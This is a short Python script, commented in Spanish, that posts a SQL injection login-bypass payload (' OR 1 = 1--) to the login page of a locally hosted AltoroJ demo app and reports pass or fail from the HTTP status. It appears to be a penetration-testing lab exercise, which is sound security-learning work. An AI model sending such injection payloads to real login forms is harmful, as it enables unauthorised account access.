import requests

url = "http://localhost:8080/AltoroJ/login.jsp"

# Establecemos los campos que necesitamos
params = {"uid":"' OR 1 = 1--", "passw":""}
headers = {"User-Agent": "Linux", "Fake header": "True value"}
cookies = {}
proxies = {}


# Hacemos el post
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

reason = pr.reason
status_code = pr.status_code

print(f"{reason} {status_code}")

if(reason == 'OK' and status_code == 200):
	print("Paso")
	exit(1)
else:
	print("Fallo")
	exit(0)









